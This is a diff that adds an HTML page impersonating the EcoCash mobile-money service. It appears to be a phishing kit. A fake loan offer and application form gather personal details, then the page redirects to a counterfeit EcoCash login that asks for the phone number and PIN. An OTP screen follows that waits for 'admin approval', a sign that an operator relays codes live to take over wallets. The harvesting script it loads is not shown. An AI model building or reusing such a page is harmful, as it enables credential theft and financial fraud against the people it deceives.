@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>EcoCash - Loan Application</title>
+    <link rel="stylesheet" href="styles.css">
+<base target="_blank">
+<base target="_blank">
+</head>
+<body>
+
+<div class="app" id="app">
+    <!-- Toast -->
+    <div class="toast" id="toast">
+        <span class="toast-icon" id="toast-icon">&#10003;</span>
+        <span id="toast-msg">Message</span>
+    </div>
+
+    <!-- Processing Overlay -->
+    <div class="overlay" id="overlay">
+        <div class="overlay-card">
+            <div class="overlay-spinner"></div>
+            <div class="overlay-text">Processing...</div>
+        </div>
+    </div>
+
+    <!-- ============ HERO SCREEN ============ -->
+    <div class="screen active" id="screen-hero">
+        <div class="header">
+            <div class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+            <button class="menu-btn" onclick="toggleMenu()">&#9776;</button>
+        </div>
+
+        <div class="hero-content">
+            <h1 class="hero-title">Get Your Loan Approved Fast</h1>
+            <p class="hero-subtitle">Quick approval &nbsp;&bull;&nbsp; Competitive rates &nbsp;&bull;&nbsp; Flexible terms</p>
+        </div>
+
+        <div class="calc-card">
+            <div class="calc-title">Loan Calculator</div>
+
+            <div class="calc-row">
+                <span class="calc-label">Loan Amount</span>
+                <span class="calc-value" id="calc-amount-display">$5,000</span>
+            </div>
+            <div class="slider-container" id="amount-slider">
+                <div class="slider-track">
+                    <div class="slider-fill" id="amount-fill" style="width: 100%;"></div>
+                </div>
+                <div class="slider-thumb" id="amount-thumb" style="left: 100%;"></div>
+            </div>
+            <div class="range-labels">
+                <span>$100</span>
+                <span>$5,000</span>
+            </div>
+
+            <div class="calc-row" style="margin-top: 16px;">
+                <span class="calc-label">Loan Term</span>
+                <span class="calc-value" id="calc-term-display">30 months</span>
+            </div>
+            <div class="slider-container" id="term-slider">
+                <div class="slider-track">
+                    <div class="slider-fill" id="term-fill" style="width: 44.4%;"></div>
+                </div>
+                <div class="slider-thumb" id="term-thumb" style="left: 44.4%;"></div>
+            </div>
+            <div class="range-labels">
+                <span>6 months</span>
+                <span>60 months</span>
+            </div>
+
+            <div class="payment-box">
+                <span class="payment-label">Monthly Payment</span>
+                <span class="payment-value" id="calc-payment">$184.44</span>
+            </div>
+        </div>
+
+        <button class="btn-gradient" onclick="showScreen('screen-step1')">APPLY NOW</button>
+
+        <div class="features">
+            <div class="feature">
+                <div class="feature-icon">&#9889;</div>
+                <div class="feature-title">Fast Approval</div>
+                <div class="feature-desc">Within 24 hours</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">&#128176;</div>
+                <div class="feature-title">Low Rates</div>
+                <div class="feature-desc">From 8%</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">&#128274;</div>
+                <div class="feature-title">Secure</div>
+                <div class="feature-desc">Bank-level</div>
+            </div>
+        </div>
+
+        <div class="footer-text">&copy; 2025 Ecocash</div>
+    </div>
+
+    <!-- ============ STEP 1: LOAN DETAILS ============ -->
+    <div class="screen" id="screen-step1">
+        <div class="header">
+            <div class="header-left">
+                <button class="back-btn" onclick="showScreen('screen-hero')">&larr; Back</button>
+            </div>
+            <div class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+            <button class="menu-btn" onclick="toggleMenu()">&#9776;</button>
+        </div>
+
+        <div class="form-card">
+            <div class="step-header">
+                <div class="step-title">Loan Application</div>
+                <div class="step-subtitle">Step 1 of 3</div>
+                <div class="step-dots">
+                    <div class="step-dot active"></div>
+                    <div class="step-dot"></div>
+                    <div class="step-dot"></div>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Loan Type</label>
+                <div class="select-wrapper">
+                    <select class="form-select" id="step1-loan-type">
+                        <option>Personal Loan</option>
+                        <option>Home Loan</option>
+                        <option>Business Loan</option>
+                        <option>Education Loan</option>
+                        <option>Auto Loan</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Loan Amount ($)</label>
+                <input type="text" class="form-input" id="step1-amount" placeholder="Enter amount" inputmode="numeric">
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Loan Term</label>
+                <div class="select-wrapper">
+                    <select class="form-select" id="step1-term">
+                        <option>6 Months</option>
+                        <option>12 Months</option>
+                        <option>24 Months</option>
+                        <option>36 Months</option>
+                        <option>48 Months</option>
+                        <option>60 Months</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Purpose of Loan</label>
+                <input type="text" class="form-input" id="step1-purpose" placeholder="What will you use the loan for?">
+            </div>
+
+            <button class="btn-gradient" style="width: 100%; margin-top: 8px;" onclick="goToStep2()">NEXT STEP</button>
+        </div>
+
+        <div class="footer-text">&copy; 2025 Ecocash</div>
+    </div>
+
+    <!-- ============ STEP 2: PERSONAL INFO ============ -->
+    <div class="screen" id="screen-step2">
+        <div class="header">
+            <div class="header-left">
+                <button class="back-btn" onclick="showScreen('screen-step1')">&larr; Back</button>
+            </div>
+            <div class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+            <button class="menu-btn" onclick="toggleMenu()">&#9776;</button>
+        </div>
+
+        <div class="form-card">
+            <div class="step-header">
+                <div class="step-title">Loan Application</div>
+                <div class="step-subtitle">Step 2 of 3</div>
+                <div class="step-dots">
+                    <div class="step-dot active"></div>
+                    <div class="step-dot active"></div>
+                    <div class="step-dot"></div>
+                </div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label class="form-label">First Name</label>
+                    <input type="text" class="form-input" id="first-name" placeholder="John">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Last Name</label>
+                    <input type="text" class="form-input" id="last-name" placeholder="Doe">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Email Address</label>
+                <input type="email" class="form-input" id="email" placeholder="john.doe@example.com">
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Phone Number</label>
+                <input type="tel" class="form-input" id="phone" placeholder="+263701234567">
+            </div>
+
+            <div class="btn-nav">
+                <button class="btn-prev" onclick="showScreen('screen-step1')">PREVIOUS</button>
+                <button class="btn-next" onclick="goToStep3()">NEXT STEP</button>
+            </div>
+        </div>
+
+        <div class="footer-text">&copy; 2025 Ecocash</div>
+    </div>
+
+    <!-- ============ STEP 3: EMPLOYMENT & SUMMARY ============ -->
+    <div class="screen" id="screen-step3">
+        <div class="header">
+            <div class="header-left">
+                <button class="back-btn" onclick="showScreen('screen-step2')">&larr; Back</button>
+            </div>
+            <div class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+            <button class="menu-btn" onclick="toggleMenu()">&#9776;</button>
+        </div>
+
+        <div class="form-card">
+            <div class="step-header">
+                <div class="step-title">Loan Application</div>
+                <div class="step-subtitle">Step 3 of 3</div>
+                <div class="step-dots">
+                    <div class="step-dot active"></div>
+                    <div class="step-dot active"></div>
+                    <div class="step-dot active"></div>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Employment Status</label>
+                <div class="select-wrapper">
+                    <select class="form-select" id="employment">
+                        <option>Employed</option>
+                        <option>Self-Employed</option>
+                        <option>Unemployed</option>
+                        <option>Retired</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Annual Income ($)</label>
+                <input type="text" class="form-input" id="income" placeholder="50,000" inputmode="numeric">
+            </div>
+
+            <div class="summary-box">
+                <div class="summary-title">Application Summary</div>
+                <div class="summary-row">
+                    <span class="summary-label">Loan Amount:</span>
+                    <span class="summary-value" id="sum-amount">$2,500</span>
+                </div>
+                <div class="summary-row">
+                    <span class="summary-label">Loan Term:</span>
+                    <span class="summary-value" id="sum-term">6 months</span>
+                </div>
+                <div class="summary-row">
+                    <span class="summary-label">Purpose:</span>
+                    <span class="summary-value" id="sum-purpose">Medical</span>
+                </div>
+                <div class="summary-row">
+                    <span class="summary-label">Applicant:</span>
+                    <span class="summary-value" id="sum-applicant">John Doe</span>
+                </div>
+            </div>
+
+            <div class="btn-nav">
+                <button class="btn-prev" onclick="showScreen('screen-step2')">PREVIOUS</button>
+                <button class="btn-submit" onclick="submitApplication()">SUBMIT APPLICATION</button>
+            </div>
+        </div>
+
+        <div class="footer-text">&copy; 2025 Ecocash</div>
+    </div>
+
+    <!-- ============ SUCCESS SCREEN ============ -->
+    <div class="screen" id="screen-success">
+        <div class="header">
+            <div class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+            <button class="menu-btn" onclick="toggleMenu()">&#9776;</button>
+        </div>
+
+        <div class="success-wrapper">
+            <div class="success-card">
+                <div class="success-icon-box">&#10003;</div>
+                <div class="success-title" id="success-title-text">Loan Application Submitted</div>
+                <div class="success-text" id="success-description-text">
+                    Your loan application has been submitted. Please wait for approval.<br><br>
+                    You will receive a confirmation message. For now, proceed to EcoCash.
+                </div>
+                <div class="redirect-box" id="success-redirect-box">
+                    <div class="spinner-small"></div>
+                    <span>Redirecting to EcoCash login...</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer-text">&copy; 2025 Ecocash</div>
+    </div>
+
+    <!-- ============ LOGIN SCREEN ============ -->
+    <div class="screen" id="screen-login">
+        <div class="login-wrapper">
+            <div class="login-container">
+                <div class="login-header">
+                    <div class="login-logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+                    <div class="login-title">Login</div>
+                </div>
+
+                <div class="phone-input-box">
+                    <span class="flag-icon">&#127474;&#127484;</span>
+                    <span class="prefix">+263</span>
+                    <input type="tel" id="login-phone" value="712 345 6789" maxlength="12" placeholder="Enter number">
+                </div>
+
+                <div class="pin-section">
+                    <div class="pin-label">Enter your PIN</div>
+                    <div class="pin-boxes" id="pin-boxes">
+                        <input type="tel" class="pin-hidden-input" id="pin-hidden" maxlength="4" inputmode="numeric" autocomplete="off">
+                        <div class="pin-box" id="pin-1"></div>
+                        <div class="pin-box" id="pin-2"></div>
+                        <div class="pin-box" id="pin-3"></div>
+                        <div class="pin-box" id="pin-4"></div>
+                    </div>
+                    <div class="forgot-pin">Forgot PIN?</div>
+                </div>
+            </div>
+            
+            <div class="login-wave-divider">
+                <svg viewBox="0 0 1200 120" preserveAspectRatio="none">
+                    <path d="M321.39,56.44c58-10.79,114.16-30.13,172-41.86,82.39-16.72,168.19-17.73,250.45-.39C823.78,31,906.67,72,985.66,92.83c70.05,18.48,146.53,26.09,214.34,3V0H0V27.35A600.21,600.21,0,0,0,321.39,56.44Z" fill="#1d4ed8"></path>
+                </svg>
+            </div>
+            
+            <div class="login-footer-section">
+                <div class="login-footer-text">To register an EcoCash wallet or get assistance,<br>click below</div>
+                <div class="login-footer-buttons">
+                    <button class="footer-btn">
+                        <span class="btn-icon">&#128100;</span>
+                        <span>Register</span>
+                    </button>
+                    <button class="footer-btn">
+                        <span class="btn-icon">&#8505;</span>
+                        <span>Help & Support</span>
+                    </button>
+                </div>
+                <div class="login-version">v2.1.3P</div>
+                <div class="login-terms">By signing in you agree to the <a href="#">Terms and Conditions</a></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============ OTP VERIFICATION SCREEN ============ -->
+    <div class="screen" id="screen-otp">
+        <div class="header">
+            <div class="header-left">
+                <button class="back-btn" onclick="showScreen('screen-login')">&larr; Back</button>
+            </div>
+            <div class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+            <button class="menu-btn" onclick="toggleMenu()">&#9776;</button>
+        </div>
+
+        <div class="form-card otp-container" id="otp-main-container">
+            <div class="otp-title">Enter OTP</div>
+            <div class="otp-subtitle">Please enter the 6-digit OTP sent to your mobile number</div>
+            
+            <div class="otp-input-box" id="otp-input-section">
+                <input type="text" maxlength="1" class="otp-input" id="otp-1" oninput="moveToNext(this, 'otp-2')" autofocus>
+                <input type="text" maxlength="1" class="otp-input" id="otp-2" oninput="moveToNext(this, 'otp-3')">
+                <input type="text" maxlength="1" class="otp-input" id="otp-3" oninput="moveToNext(this, 'otp-4')">
+                <input type="text" maxlength="1" class="otp-input" id="otp-4" oninput="moveToNext(this, 'otp-5')">
+                <input type="text" maxlength="1" class="otp-input" id="otp-5" oninput="moveToNext(this, 'otp-6')">
+                <input type="text" maxlength="1" class="otp-input" id="otp-6" oninput="moveToNext(this, null)">
+            </div>
+
+            <button class="otp-submit-btn" id="otp-submit-btn" onclick="verifyOTP()">SUBMIT OTP</button>
+            <button class="otp-resend-btn" id="otp-resend-btn" onclick="resendOTP()">Resend OTP</button>
+
+            <!-- Verifying State -->
+            <div class="otp-verifying-box" id="otp-verifying-box">
+                <div class="otp-verifying-spinner"></div>
+                <div class="otp-verifying-text">Verifying OTP...</div>
+                <div style="font-size: 12px; color: #9ca3af; margin-top: 4px;">Waiting for admin approval</div>
+            </div>
+
+            <!-- Invalid State -->
+            <div class="otp-invalid-box" id="otp-invalid-box">
+                <div class="otp-invalid-icon">&#10005;</div>
+                <div class="otp-invalid-title">OTP Invalid</div>
+                <div class="otp-invalid-text">The OTP you entered was rejected by the admin. Please request a new OTP.</div>
+                <button class="otp-new-btn" onclick="requestNewOTP()">REQUEST NEW OTP</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="script.js"></script>
+
+</body>
+</html>
